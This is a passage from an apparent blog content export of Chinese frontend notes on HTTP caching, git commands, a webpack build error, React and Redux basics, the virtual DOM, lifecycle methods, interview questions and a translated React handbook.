（4）private：只能针对个人用户，而不能被代理服务器缓存； （5）no-cache：强制客户端直接向服务器发送请求,也就是说每次请求都必须向服务器发送。服务器接收到 请求，然后判断资源是否变更，是则返回新内容，否则返回304，未变更。这个很容易让人产生误解，使人误 以为是响应不被缓存。实际上Cache-Control: no-cache是会被缓存的，只不过每次在向客户端（浏览器）提供响应数据时，缓存都要向服务器评估缓存响应的有效性。 （6）no-store：禁止一切缓存（这个才是响应不被缓存的意思）。 协商缓存： Last-Modifued/If-Modified-Since和Etag/If-None-Match是分别成对出现的，呈一一对应关系 Etag/If-None-Match： Etag： Etag是属于HTTP 1.1属性，它是由服务器（Apache或者其他工具）生成返回给前端，用来帮助服务器控制Web端的缓存验证。 Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。 If-None-Match: 当资源过期时，浏览器发现响应头里有Etag,则再次像服务器请求时带上请求头if-none-match(值是Etag的值)。服务器收到请求进行比对，决定返回200或304 Last-Modifued/If-Modified-Since： Last-Modified： 浏览器向服务器发送资源最后的修改时间 If-Modified-Since： 当资源过期时（浏览器判断Cache-Control标识的max-age过期），发现响应头具有Last-Modified声明，则再次像服务器请求时带上头if-modified-since，表示请求时间。服务器收到请求后发现有if-modified-since则与被请求资源的最后修改时间进行对比（Last-Modified）,若最后修改时间较新（大），说明资源又被改过，则返回最新资源，HTTP 200 OK;若最后修改时间较旧（小），说明资源无新修改，响应HTTP 304 走缓存。 Last-Modifued/If-Modified-Since的时间精度是秒，而Etag可以更精确。 Etag优先级是高于Last-Modifued的，所以服务器会优先验证Etag","categories":[],"tags":[]},{"title":"浏览器缓存的了解","slug":"浏览器缓存的了解","date":"2019-04-10T02:44:03.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2019/04/10/浏览器缓存的了解/","link":"","permalink":"https://harrypangpang.github.io/2019/04/10/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9A%84%E4%BA%86%E8%A7%A3/","excerpt":"","text":"浏览器缓存 主要指的是 htttp的缓存 ，即协议层的缓存 协议层的缓存 分为 强制缓存 和 对比缓存 强制缓存： 概念：只有当 缓存失效时 才会向服务器获取最新资源。 方式： Expires 和 Cache-Control 1.Expires： Expires: Thu, 10 Nov 2017 08:45:11 GMT 绝对时间，受客户端本地时间的影响，修改后会导致浏览器的缓存判断失效，而重新请求。并且 修改后会导致 客户端 与服务端时间不一致，使得缓存失效 2.Cache-Control： 例： Response Header： Cache-Control：max-age=25454500 max-age：即最大有效时间，在上面的例子中我们可以看到 no-cache：表示没有缓存，即告诉浏览器该资源并没有设置缓存 s-maxage：同max-age，但是仅用于共享缓存，如CDN缓存 public：多用户共享缓存，默认设置 private：不能够多用户共享，HTTP认证之后，字段会自动转换成private。 相对时间，所以不会受客户端的 影响。可配置性强。 对比缓存： 概念：简单来说就是 先去找缓存，然后获取缓存的标识，拿着标识去服务请求 确认该数据是否更新过， 如果更新了 就返回最新的数据。否则 返回304，从缓存中获取数据。 方式：Last-Modified和If-Modified-Since 和 Etag Last-Modified：服务器告知客户端，资源最后一次被修改的时间 例： Response Header： Last-Modified: Thu, 10 Nov 2015 08:45:11 GMT If-Modified-Since： 再次请求时，请求头中带有该字段，服务器会将If-Modified-Since的值与Last-Modified字段进行对比， 如果相等，则表示未修改，响应304； 反之，则表示修改了，响应200状态码，返回数据。 Etag：就是个hash值。每次随着数据资源返回，来回传递，进行识别对比，来判断是否返回304或者数据资源","categories":[],"tags":[]},{"title":"发布流程","slug":"发布流程","date":"2019-03-01T07:28:21.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2019/03/01/发布流程/","link":"","permalink":"https://harrypangpang.github.io/2019/03/01/%E5%8F%91%E5%B8%83%E6%B5%81%E7%A8%8B/","excerpt":"","text":"不能算是正规的发布系统，只是按照自己的需求、能力和想法实现的一个简单的自动化 主要涉及的地方 代码仓库 静态资源站点 web站点 逻辑 打包 1. 从代码仓库拉取代码到静态资源站点 2. 生成版本号（即时间戳）命名的文件夹 3. 输出版本号 发布 1. 修改输出HTML引用文件的版本号 功能 web服务 静态资源站点 可视化发布站点","categories":[],"tags":[]},{"title":"React学习笔记","slug":"React学习笔记","date":"2019-02-26T06:39:32.000Z","updated":"2023-02-23T03:30:13.096Z","comments":true,"path":"2019/02/26/React学习笔记/","link":"","permalink":"https://harrypangpang.github.io/2019/02/26/React%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"React是一种 声明式 高效 灵活 构建用户界面的框架 组件 ：React.Component{} 组件是接受 名为 props的参数 {this.props.name}， 即 当前组件被应用时， 传入的各个数据，包括事件等； 4.render返回的是一个React元素 ：渲染内容的描述 一般使用JSX语法来扩展 ： -----&gt; React.createElement(“div”) 5.通过 这样的标签你就可以在 React 当中调用整个 ShoppingList 组件 添加样式用 className = “aaaa”, 事件： onClick={ () =&gt; alert(“click”)} this.state 为自身设置自身的状态数据， 存储变化的数据 this.setState 用于设置 值 ，每次触发时都会开始准备更新组件 跟随数据改变了的内容。 状态提升： 子组件的state数据提升至共同的 父组件 中保存。然后 父组件 通过Props 将 状态 数据传递到子组件中 ------&gt; 方便状态数据共享交流 key React当中使用的一种特殊的属性，(以及ref属性)，无法通过props获取到key，React会自动判断元素更新时使用key，而组件自己无法获取到key的。 组件key值被改变就会被当作新创建的组件处理。 组件的 keys 值并不需要在全局都保证唯一，只需要在当前的节点里保证唯一即可 二.Redux 概念： （1）Web 应用是一个状态机，视图与状态是一一对应的。 （2）所有的状态，保存在一个对象里面。 Store: 保存数据的地方，看成一个容器， 整个应用只能有一个store 提供的方法函数： createStore，用于生成store，接受了另一个函数参数，返回新生成的store对象 例：import { createStore } from ‘redux’; const store = createStore(fn); State： 时点的数据集合叫做 State， 如，当前时刻的 State，通过 store.getState() 拿到 import { createStore } from ‘redux’; const store = createStore(fn); const state = store.getState(); Redux 规定， 一个 State 对应一个 View。只要 State 相同，View 就相同。你知道 State，就知道 View 是什么样，反之亦然。 Action： Action 就是 View 发出的通知，表示 State 应该要发生变化了 Action 是一个对象。其中的type属性是必须的。表示Action 的名称。其他属性可以自由设置， const action = { type: ‘ADD_TODO’, payload: ‘Learn Redux’ }; 可以这样理解，Action 描述当前发生的事情。改变 State 的唯一办法，就是使用 Action。它会运送数据到 Store。 Action Creator: View 要发送多少种消息，就会有多少种 Action。如果都手写，会很麻烦。可以定义一个函数来生成 Action，这个函数就叫 Action Creator。 例： const ADD_TODO = ‘添加 TODO’; function addTodo(text) { return { type: ADD_TODO, text } } const action =addTodo(‘Learn Redux’); store.dispatch()： store.dispatch()是 View 发出 Action 的唯一方法。 store.dispatch接受一个 Action 对象作为参数，将它发送出去 store.dispatch(addTodo(‘Learn Redux’)); Reducer： Store 收到 Action 以后，必须给出一个新的 State，这样 View 才会发生变化。这种 State 的计算过程就叫做 Reducer。 例： const defaultState = 0; const reducer = (state = defaultState, action) =&gt; { switch (action.type) { case ‘ADD’: return state + action.payload; default: return state; }}; const state = reducer(1, { type: ‘ADD’, payload: 2}); createStore接受 Reducer 作为参数，生成一个新的 Store。以后每当store.dispatch发送过来一个新的 Action，就会自动调用 Reducer，得到新的 State。 例： const actions = [ { type: ‘ADD’, payload: 0 }, { type: ‘ADD’, payload: 1 }, { type: ‘ADD’, payload: 2 }]; const total = actions.reduce(reducer, 0); // 3 纯函数： 只要是同样的输入，必定得到同样的输出。 store.subscribe()： 方法设置监听函数，一旦 State 发生变化，就自动执行这个函数。 例： import { createStore } from ‘redux’; const store = createStore(reducer); store.subscribe(listener); 只要把 View 的更新函数（对于 React 项目，就是组件的render方法或setState方法）放入listen，就会实现 View 的自动渲染。 store.subscribe方法返回一个函数，调用这个函数就可以解除监听。 Reducer 的拆分： combinReducers:用于 Reducer 的拆分。你只要定义各个子 Reducer 函数，然后用这个方法，将它们合成一个大的 Reducer。 例： import { combineReducers } from ‘redux’; const chatReducer = combineReducers({ chatLog, statusMessage, userName }) export default todoApp; State 的属性名必须与子 Reducer 同名 不同名的写法： const reducer = combineReducers({ a: doSomethingWithA, b: processB, c: c }) // 等同于 function reducer(state = {}, action) { return { a: doSomethingWithA(state.a, action), b: processB(state.b, action), c: c(state.c, action) }} 可以把所有子 Reducer 放在一个文件里面，然后统一引入。 import { combineReducers } from ‘redux’ import * as reducers from ‘./reducers’ const reducer = combineReducers(reducers) Redux流程： 1.用户发出Action–&gt; stroe.dispatch(action); 2.store自动调用Reducer,传入（当前state，action），返回新的State。 例： let nextState = todoApp（previousState，action）； 3.state发生变化，store会调用监听函数。： 例：stroe.subscribe(listener); listener可以通过 store.getStore() 得到当前状态，react此时会触发重新渲染view； 例： function listerner() { let newState = store.getState(); component.setState(newState); }","categories":[],"tags":[]},{"title":"常用的一些git命令行","slug":"常用的一些git命令行","date":"2019-02-16T03:41:21.000Z","updated":"2023-02-23T03:30:13.100Z","comments":true,"path":"2019/02/16/常用的一些git命令行/","link":"","permalink":"https://harrypangpang.github.io/2019/02/16/%E5%B8%B8%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9Bgit%E5%91%BD%E4%BB%A4%E8%A1%8C/","excerpt":"","text":"工作中常用的一些git命令行 相关概念 四个库 四种文件状态 工作区 Unstracked(未被跟踪的) Modified(有修改的，和本地仓库快照不同) 暂存区 staged(暂存状态) 本地仓库 Unmodify(未改动) 远程仓库 克隆代码仓库 git clone 仓库地址 远程地址为仓库地址 暂存区操作 git add 文件名 添加文件到暂存区 git add . 添加所有（未被添加过但存在在仓库文件夹里的）文件到暂存区 git rm 文件名 从暂存区删除文件,文件会被删除 git rm 文件名 -f 从暂存区强制删除，文件会被删除 git rm 文件名 --cached 从暂存区删除，但是文件不会被删除，状态变为Unstracked git checkout -- 文件名 从暂存区拉取文件覆盖到工作区 git reset HEAD 文件名 从本地仓库拉取文件覆盖到暂存区 git mv 'oldName' 'newName' 更改文件名 git status 获取仓库状态，包含四个库和文件状态 git reset --hard HEAD^ 重置到上一个commit状态，覆盖staged和工作区 git reset --hard &lt;commitkey&gt; 重置到对应commit版本，覆盖staged和工作区 一些技巧 工作区误删文件（手动删除） git checkout -- 文件名 暂存区误删文件，删除之后想恢复 git reset HEAD 文件名 + git checkout -- 文件名 本地仓库操作 git commit -m 提交描述信息 将暂存区里的改动提交到本地仓库， -m 参数表示带入提交描述信息，不加命令行会打开vim在让你输入 git commit -a -m 提交描述信息 将所有非Unstracked\b状态的文件改动提交到本地仓库，相当于git add 改动文件 + git commit -m git commit --amend 补充上一次的提交 远程仓库操作 git remote -v 查看目前远程仓库地址 git remote add origin 远程仓库地址 添加远程仓库地址，已经有了的话会失败 git remote origin 删除远程仓库，解除关联 git remote set-url origin 远程仓库地址 设置远程仓库地址，可覆盖 git push -u origin master 推送本地仓库到远程仓库master分支，-u表示关联，之后可省略为git push, git pull git pull 从远程仓库拉取到本地 基础操作流程图(不包含全部)","categories":[],"tags":[]},{"title":"webpack下build报错","slug":"webpack下build报错","date":"2019-02-09T08:01:23.000Z","updated":"2023-02-23T03:30:13.097Z","comments":true,"path":"2019/02/09/webpack下build报错/","link":"","permalink":"https://harrypangpang.github.io/2019/02/09/webpack%E4%B8%8Bbuild%E6%8A%A5%E9%94%99/","excerpt":"","text":"执行npm run build时报错如下： D:\\MyProjects\\react_ssr_demo&gt;npm run build &gt; react_ssr_demo@1.0.0 build D:\\MyProjects\\react_ssr_demo &gt; webpack --config build/webpack.config.js Hash: 0b1003a436390263970e Version: webpack 4.29.3 Time: 633ms Built at: 2019-02-09 15:46:04 1 asset Entrypoint app = app.0b1003a436390263970e.js [2] ./client/App.jsx 3 KiB &#123;0&#125; [not cacheable] [built] [failed] [1 error] [3] ./client/app.js 100 bytes &#123;0&#125; [built] [9] (webpack)/buildin/global.js 472 bytes &#123;0&#125; [built] + 7 hidden modules WARNING in configuration The &#x27;mode&#x27; option has not been set, webpack will fallback to &#x27;production&#x27; for th is value. Set &#x27;mode&#x27; option to &#x27;development&#x27; or &#x27;production&#x27; to enable defaults for each environment. You can also set it to &#x27;none&#x27; to disable any default behavior. Learn more: https ://webpack.js.org/concepts/mode/ ERROR in ./client/App.jsx Module build failed (from ./node_modules/_babel-loader@8.0.5@babel-loader/lib/in dex.js): Error: Cannot find module &#x27;@babel/core&#x27; babel-loader@8 requires Babel 7.x (the package &#x27;@babel/core&#x27;). If you&#x27;d like to use Babel 6.x (&#x27;babel-core&#x27;), you should install &#x27;babel-loader@7&#x27;. at Function.Module._resolveFilename (internal/modules/cjs/loader.js:581:15) at Function.Module._load (internal/modules/cjs/loader.js:507:25) at Module.require (internal/modules/cjs/loader.js:637:17) at require (D:\\MyProjects\\react_ssr_demo\\node_modules\\_v8-compile-cache@2.0. 2@v8-compile-cache\\v8-compile-cache.js:159:20) at Object.&lt;anonymous&gt; (D:\\MyProjects\\react_ssr_demo\\node_modules\\_babel-load er@8.0.5@babel-loader\\lib\\index.js:10:11) at Module._compile (D:\\MyProjects\\react_ssr_demo\\node_modules\\_v8-compile-ca che@2.0.2@v8-compile-cache\\v8-compile-cache.js:178:30) at Object.Module._extensions..js (internal/modules/cjs/loader.js:700:10) at Module.load (internal/modules/cjs/loader.js:599:32) at tryModuleLoad (internal/modules/cjs/loader.js:538:12) at Function.Module._load (internal/modules/cjs/loader.js:530:3) at Module.require (internal/modules/cjs/loader.js:637:17) at require (D:\\MyProjects\\react_ssr_demo\\node_modules\\_v8-compile-cache@2.0. 2@v8-compile-cache\\v8-compile-cache.js:159:20) at loadLoader (D:\\MyProjects\\react_ssr_demo\\node_modules\\_loader-runner@2.4. 0@loader-runner\\lib\\loadLoader.js:18:17) at iteratePitchingLoaders (D:\\MyProjects\\react_ssr_demo\\node_modules\\_loader -runner@2.4.0@loader-runner\\lib\\LoaderRunner.js:169:2) at runLoaders (D:\\MyProjects\\react_ssr_demo\\node_modules\\_loader-runner@2.4. 0@loader-runner\\lib\\LoaderRunner.js:365:2) at NormalModule.doBuild (D:\\MyProjects\\react_ssr_demo\\node_modules\\_webpack@ 4.29.3@webpack\\lib\\NormalModule.js:280:3) at NormalModule.build (D:\\MyProjects\\react_ssr_demo\\node_modules\\_webpack@4. 29.3@webpack\\lib\\NormalModule.js:427:15) at Compilation.buildModule (D:\\MyProjects\\react_ssr_demo\\node_modules\\_webpa ck@4.29.3@webpack\\lib\\Compilation.js:635:10) at factory.create (D:\\MyProjects\\react_ssr_demo\\node_modules\\_webpack@4.29.3 @webpack\\lib\\Compilation.js:884:14) at factory (D:\\MyProjects\\react_ssr_demo\\node_modules\\_webpack@4.29.3@webpac k\\lib\\NormalModuleFactory.js:405:6) at hooks.afterResolve.callAsync (D:\\MyProjects\\react_ssr_demo\\node_modules\\_ webpack@4.29.3@webpack\\lib\\NormalModuleFactory.js:155:13) at AsyncSeriesWaterfallHook.eval [as callAsync] (eval at create (D:\\MyProjec ts\\react_ssr_demo\\node_modules\\_tapable@1.1.1@tapable\\lib\\HookCodeFactory.js:32: 10), &lt;anonymous&gt;:6:1) at resolver (D:\\MyProjects\\react_ssr_demo\\node_modules\\_webpack@4.29.3@webpa ck\\lib\\NormalModuleFactory.js:138:29) at process.nextTick (D:\\MyProjects\\react_ssr_demo\\node_modules\\_webpack@4.29 .3@webpack\\lib\\NormalModuleFactory.js:342:9) at process._tickCallback (internal/process/next_tick.js:61:11) @ ./client/app.js 2:0-27 4:16-19 npm ERR! code ELIFECYCLE npm ERR! errno 2 npm ERR! react_ssr_demo@1.0.0 build: `webpack --config build/webpack.config.js` npm ERR! Exit status 2 npm ERR! npm ERR! Failed at the react_ssr_demo@1.0.0 build script. npm ERR! This is probably not a problem with npm. There is likely additional log ging output above. npm ERR! A complete log of this run can be found in: npm ERR! C:\\Users\\Administrator.PC-201812050004\\AppData\\Roaming\\npm-cache\\_l ogs\\2019-02-09T07_46_04_537Z-debug.log 这里面有两个问题 WARNING in configuration 解决方法：在webpack.config.js下增加mode: ‘none’ module.exports = { mode: ‘none’, Error: Cannot find module ‘@babel/core’ babel-loader@8 requires Babel 7.x (the package ‘@babel/core’). If you’d like to use Babel 6.x (‘babel-core’), you should install ‘babel-loader@7’. 解决方法：npm i babel-loader@7 -D","categories":[],"tags":[{"name":"日常踩坑","slug":"日常踩坑","permalink":"https://harrypangpang.github.io/tags/%E6%97%A5%E5%B8%B8%E8%B8%A9%E5%9D%91/"}]},{"title":"React虚拟dom和diff算法","slug":"React虚拟dom和diff算法","date":"2019-01-30T07:02:10.000Z","updated":"2023-02-23T03:30:13.096Z","comments":true,"path":"2019/01/30/React虚拟dom和diff算法/","link":"","permalink":"https://harrypangpang.github.io/2019/01/30/React%E8%99%9A%E6%8B%9Fdom%E5%92%8Cdiff%E7%AE%97%E6%B3%95/","excerpt":"","text":"什么是虚拟dom？ 这就要从react如何渲染出页面开始 通常情况下的步骤是这样 获取state数据 JSX模板 state+JSX模板结合，生成真实dom并显示 这个是在state不发生变化的情况下，（state或者prop发生变化都会调用render函数，重新渲染页面） state数据变化时，通常理解下应该是下面的步骤 获取state数据 JSX模板 state数据+JSX模板结合，生成真实dom并显示 state数据发生变化 新的state数据+JSX模板结合，生成真实dom并显示 这样可以实现，但是非常消耗性能，因为会渲染两次dom树，所以react就采用一种虚拟dom的方法来进行dom更新。 JSX转成dom流程 用JSX语法时，渲染dom的流程：JSX——JS dom描述对象——真实dom 具体步骤： 获取state数据 JSX模板 生成虚拟dom（虚拟dom就是一个JS对象，里面包含了对真实dom的描述 [&#x27;div&#x27;,&#123;id:&#x27;a&#x27;&#125;,[&#x27;span&#x27;,&#123;&#125;,&#x27;hello&#x27;]] 用虚拟dom解构，生成真实dom并显示 &lt;div id=&#x27;a&#x27;&gt;&lt;span&gt;hello&lt;/span&gt;&lt;/div&gt; state数据发生变化（比如hello变成了hi） 生成新的虚拟dom [&#x27;div&#x27;,&#123;id:&#x27;a&#x27;&#125;,[&#x27;span&#x27;,&#123;&#125;,&#x27;hi&#x27;]] 比较原始虚拟dom和新的虚拟dom的区别，找出区别是span里的内容 直接操作dom，只改变span里的内容 虚拟dom的好处 性能提升，dom比对变成js对象比对 使得跨端应用得以实现（react native） 在浏览器中可以用虚拟dom生成真实dom显示，在原生应用中也可以用虚拟dom生成对应的方式来显示页面 虚拟dom中的diff算法 在上面我们介绍了react中state变化时，dom是如何发生变化的，在第七步中比较原始虚拟dom和新的虚拟dom的区别采用的方法，就是diff算法（diffrence） 虚拟dom在什么时候会发生比对？没错，数据发生变化时，也就是调用setState时 react的虚拟dom其实是同级比较的 如上图 他的对比步骤如下 红色原始虚拟dom和新的虚拟dom，没有变化，保持不变，往下继续比对 蓝色原始虚拟dom和新的虚拟dom，没有变化，保持不变，往下继续比对 绿色原始虚拟dom和新的虚拟dom，没有变化，保持不变，往下继续比对，浅蓝色原始虚拟dom和新的虚拟dom，没有变化，保持不变，往下继续比对 但凡在上面哪一步骤出现不同，就不再继续比对，而是删除下面的全部节点，采用新的虚拟dom(例如：如果红色框的原始虚拟dom和新的虚拟dom不一致，那么就不在进行比对，采用新的虚拟dom来生成dom) key的作用 react利用key来识别组件，它是一种身份标识标识，来提高虚拟dom的比对速度看下面 比如我要在abcde中添加一个f 如果我们没有key值，那我们就需要A比对一遍，B对比一遍，以此类推很好性能，而有了key，就像下面的图一样，我们很快就知道只有f与之前不同，提高了列表渲染的性能","categories":[],"tags":[]},{"title":"react生命周期","slug":"react生命周期","date":"2019-01-27T08:30:48.000Z","updated":"2023-02-23T03:30:13.097Z","comments":true,"path":"2019/01/27/react生命周期/","link":"","permalink":"https://harrypangpang.github.io/2019/01/27/react%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","excerpt":"","text":"生命周期函数：在某一个时刻组件会自动调用执行的函数 React 生命周期 如图，React生命周期主要包括三个阶段：初始化阶段、运行中阶段和销毁阶段，在React不同的生命周期里，会依次触发不同的钩子函数，下面我们就来详细介绍一下React的生命周期函数 一、初始化阶段 1、设置组件的默认属性 static defaultProps = &#123; name: 'sls', age:23 &#125;; //or Counter.defaltProps=&#123;name:'sls'&#125; 复制代码 2、设置组件的初始化状态 constructor() &#123; super(); this.state = &#123;number: 0&#125; &#125; 复制代码 3、componentWillMount() 组件即将被渲染到页面之前触发，此时可以进行开启定时器、向服务器发送请求等操作 4、render() 组件渲染 5、componentDidMount() 组件已经被渲染到页面中后触发：此时页面中有了真正的DOM的元素，可以进行DOM相关的操作 二、运行中阶段 1、componentWillReceiveProps() 组件接收到属性时触发 2、shouldComponentUpdate() 当组件接收到新属性，或者组件的状态发生改变时触发。组件首次渲染时并不会触发 shouldComponentUpdate(newProps, newState) &#123; if (newProps.number &lt; 5) return true; return false &#125; //该钩子函数可以接收到两个参数，新的属性和状态，返回true/false来控制组件是否需要更新。 复制代码 一般我们通过该函数来优化性能： 一个React项目需要更新一个小组件时，很可能需要父组件更新自己的状态。而一个父组件的重新更新会造成它旗下所有的子组件重新执行render()方法，形成新的虚拟DOM，再用diff算法对新旧虚拟DOM进行结构和属性的比较，决定组件是否需要重新渲染 无疑这样的操作会造成很多的性能浪费，所以我们开发者可以根据项目的业务逻辑，在shouldComponentUpdate()中加入条件判断，从而优化性能 例如React中的就提供了一个PureComponent的类，当我们的组件继承于它时，组件更新时就会默认先比较新旧属性和状态，从而决定组件是否更新。值得注意的是，PureComponent进行的是浅比较，所以组件状态或属性改变时，都需要返回一个新的对象或数组 3、componentWillUpdate() 组件即将被更新时触发 4、componentDidUpdate() 组件被更新完成后触发。页面中产生了新的DOM的元素，可以进行DOM操作 三、销毁阶段 1、componentWillUnmount() 组件被销毁时触发。这里我们可以进行一些清理操作，例如清理定时器，取消Redux的订阅事件等等。 有兴趣的同学也可以用下面的代码进行测试 废话少说，放码过来! import React from 'react' import ReactDOM from 'react-dom'; class SubCounter extends React.Component &#123; componentWillReceiveProps() &#123; console.log('9、子组件将要接收到新属性'); &#125; shouldComponentUpdate(newProps, newState) &#123; console.log('10、子组件是否需要更新'); if (newProps.number &lt; 5) return true; return false &#125; componentWillUpdate() &#123; console.log('11、子组件将要更新'); &#125; componentDidUpdate() &#123; console.log('13、子组件更新完成'); &#125; componentWillUnmount() &#123; console.log('14、子组件将卸载'); &#125; render() &#123; console.log('12、子组件挂载中'); return ( &lt;p&gt;&#123;this.props.number&#125;&lt;/p&gt; ) &#125; &#125; class Counter extends React.Component &#123; static defaultProps = &#123; //1、加载默认属性 name: 'sls', age:23 &#125;; constructor() &#123; super(); //2、加载默认状态 this.state = &#123;number: 0&#125; &#125; componentWillMount() &#123; console.log('3、父组件挂载之前'); &#125; componentDidMount() &#123; console.log('5、父组件挂载完成'); &#125; shouldComponentUpdate(newProps, newState) &#123; console.log('6、父组件是否需要更新'); if (newState.number&lt;15) return true; return false &#125; componentWillUpdate() &#123; console.log('7、父组件将要更新'); &#125; componentDidUpdate() &#123; console.log('8、父组件更新完成'); &#125; handleClick = () =&gt; &#123; this.setState(&#123; number: this.state.number + 1 &#125;) &#125;; render() &#123; console.log('4、render(父组件挂载)'); return ( &lt;div&gt; &lt;p&gt;&#123;this.state.number&#125;&lt;/p&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;+&lt;/button&gt; &#123;this.state.number&lt;10?&lt;SubCounter number=&#123;this.state.number&#125;/&gt;:null&#125; &lt;/div&gt; ) &#125; &#125; ReactDOM.render(&lt;Counter/&gt;, document.getElementById('root'));","categories":[],"tags":[]},{"title":"201901面试题分享","slug":"201901面试题分享","date":"2019-01-22T03:01:04.000Z","updated":"2023-02-23T03:30:13.095Z","comments":true,"path":"2019/01/22/201901面试题分享/","link":"","permalink":"https://harrypangpang.github.io/2019/01/22/201901%E9%9D%A2%E8%AF%95%E9%A2%98%E5%88%86%E4%BA%AB/","excerpt":"","text":"vue生命周期 vue父子组通信 箭头函数什么情况下不能用 原型原型链介绍一下 闭包是什么 自己有没有写过node中间件 webpack有没有用过，都用哪些功能 移动端适配怎么做 rem和em的区别 css怎么画一个三角形 常规函数，箭头函数的this指向 class的super怎么用 class如何实现继承的,子类如何使用父类里的方法 数组如何去重（ES5,ES6） let const var 区别 call apply bind区别和用法 1.sayhello() 2.sayhello() 怎么都输出1 服务端渲染有没有了解过 vue的虚拟dom原理是什么？怎么实现的？ vue的beforeCreate和created区别 promise怎么实现两个同时执行 promise怎么让两个接口，接口1执行完成后执行接口2 await怎么知道后面执行的成功还是失败 promise遇到错误，catch里会有什么 用一个变量等于await+函数，那这个变量结果是什么 数组里都是数字时怎么排序？有几种方法 http请求头里都有什么内容 cookie和localstorage的区别 node登陆注册怎么做的 node token的实现 如何在同一台服务器起多个pm2进程 还有个手写的题目记不起来了，不过考的就是闭包内私有变量和全局变量的区别","categories":[],"tags":[]},{"title":"React_V16入门手册","slug":"React_V16入门手册","date":"2019-01-18T09:09:19.000Z","updated":"2023-02-23T03:30:13.096Z","comments":true,"path":"2019/01/18/React_V16入门手册/","link":"","permalink":"https://harrypangpang.github.io/2019/01/18/React_V16%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/","excerpt":"","text":"原文https://medium.freecodecamp.org/the-react-handbook-b71c27b0a795 开始着手学习React，就看到大佬推荐的这篇文章，因为是英文，就尽自己能力翻译一下有错的烦请指正。原文一共220页A4纸，内容有点多，所以会分期更新，见谅 介绍 这本React手册遵循二八原则：用20%的时间学习80%的内容 在本手册里使用了React Hooks，所以你需要使用高于等于 16.7.0-alpha.2 版本的React和ReactDom. 如果你使用create-react-app初始化项目时，在初始化项目之后运行npm install react@16.7.0-alpha.2 react-dom@16.7.0- alpha.2 我希望你能在你阅读完本手册后能达到一个目标：学会React的基础 React介绍 先来介绍一下React库 什么是React React是一个旨在简化开发可视化界面的Javascript库。它由Facebook开发，并于2013年向世界发布，并支持着很多被广泛使用的App，包括Facebook和Instagram等无数应用程序。 它的主要目标是通过将UI划分为一组组件，使得在任何时间点都可以轻松地构建界面及其状态。 为什么React这么流行？ React席卷了整个前端开发领域，为什么？ 比其他框架更低的复杂性 在React出道之前，Ember.js和Angular1.X是主流框架。这两种方法在代码上强加了太多的约定，以至于移植现有的应用程序一点都不方便。React选择了非常容易集成到现有项目中的方式，因为Facebook必须实现这一点，这样才能将其引入现有代码库。另外，这两个框架本身包含的内容太多了，而React只选择实现视图层而不是完整的MVC技术栈。 完美的时间 当谷歌宣布Angular2.X时，宣称Angular1.X并不能平滑升级到Angular2.X，这两个就像不同的框架一样，所以想要从Angular1.X升级到Angular2.X就得重构项目。因为这一点，再加上React承诺说能带来执行速度的提升，所以很多程序员就迫不及待的尝试。 Facebook的支持 如果一个项目最终成功，得到Facebook的支持显然也会让它受益。Facebook目前对React非常感兴趣，并看到了它开源的价值，这对所有在自己项目中使用React的开发者来说都是一个巨大的优势。 React学起来容易吗？ 虽然我说React要比其他框架简单，但是深入学习React的话还是挺有难度的，难的主要原因是要与React搭配使用的技术，比如Redux,GraphQL等等。 React本身有一个非常小的API，你至少需要理解4个概念才能开始: Components JSX State Props 上面这些（甚至更多）都会在手册中一一解释 如何安装React 如何在你的电脑上安装React? React是一个库，所以说安装这个词会有点奇怪，倒不如说“设置”更贴切。在你的app或者网页中有很多方式可以设置React 直接在网页里引入 最简单的方法是直接将React JavaScript文件添加到页面中。当React应用与单个页面上的元素进行交互，而不是实际控制整个导航时，这是最好的选择。 下面的例子中，你在body的最后添加了两个script标签 &lt;html&gt; ... &lt;body&gt; ... &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/16.7.0-alpha.2/umd/react.development.js&quot; crossorigin&gt; &lt;/script&gt; &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react-dom/16.7.0-alpha.2/umd/react-dom.production.min.js&quot; crossorigin&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 在这里我们引入两个库（React和React Dom），是为什么呢？因为React是百分之的独立于浏览器的，你也可以在浏览器之外使用React（比如用React Native开发移动应用时，也能用React），因此需要React Dom来操作dom。 在引入Javascript文件后，你需要为react，在html里添加script标签，才能使用JSX语法，下面两种方式都可以 //在app.js里写JSX &lt;script src=&quot;app.js&quot;&gt;&lt;/script&gt; &lt;!-- or --&gt; //直接在标签内写JSX &lt;script&gt; //my app &lt;/script&gt; 如果要使用JSX，你还需要引入Babel &lt;script src=&quot;https://unpkg.com/babel-standalone@6/babel.min.js&quot;&gt;&lt;/script&gt; 引入后要在之前写的script标签里添加type=&quot;text/babel&quot;才会生效，如下： &lt;script src=&quot;app.js&quot; type=&quot;text/babel&quot;&gt;&lt;/script&gt; 现在你可以在你的app.js里写JSX的代码了。 const Button = () =&gt; &#123; return &lt;button&gt;Click me!&lt;/button&gt; &#125; ReactDOM.render(&lt;Button /&gt;, document.getElementById(&#x27;root&#x27;)) 演示代码地址： https://glitch.com/edit/#!/react-example-inline-jsx?path=index.html:21:19 用官方脚手架create-react-app（推荐） create-react-app旨在让你能快速构建一个React项目，任何React应用都可以使用create-react-app来生成一个单页页面。 首先你需要安装npm和node （地址：https://nodejs.org/en/）就不多说了 然后执行 npx create-react-app todolist npx是npm 5.2之后才有的工具，npx会下载create-react-app，然后解压安装，然后执行create-react-app todolist,然后再把create-react-app从系统中删除。这样你就永远能够使用最新的create-react-app，不会在电脑里存放着过时的create-react-app。 执行完之后你能看到下面的界面 create-react-app会在文件夹内创建相应的文件结构，文件名就是todolist（自己取的） package.json也同样生成了，只需要安装指示，进入相应的文件夹，执行npm start就可以启动项目了 如图 打开浏览器进入http://localhost:3000/就能看到最开始的界面了。 除了 npm start , create-react-app这两个命令之外，还有下面一些命令 npm run build ：要在构建文件夹中构建准备部署到服务器的React应用程序文件 npm test：运行Jest测试包 npm eject ：弹出配置文件 何时用npm 